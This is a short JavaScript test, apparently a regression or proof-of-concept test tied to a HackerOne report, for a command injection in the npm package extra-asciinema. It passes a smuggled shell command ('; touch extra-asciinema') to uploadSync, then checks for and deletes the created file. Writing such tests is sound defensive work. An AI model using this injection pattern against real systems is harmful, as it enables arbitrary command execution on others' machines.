//https://hackerone.com/reports/863956
test("Command Injection in extra-asciinema", () => {
  const asciinema = require("extra-asciinema");
  const fs = require("fs");
  const path = "./extra-asciinema";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  asciinema.uploadSync("; touch extra-asciinema");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
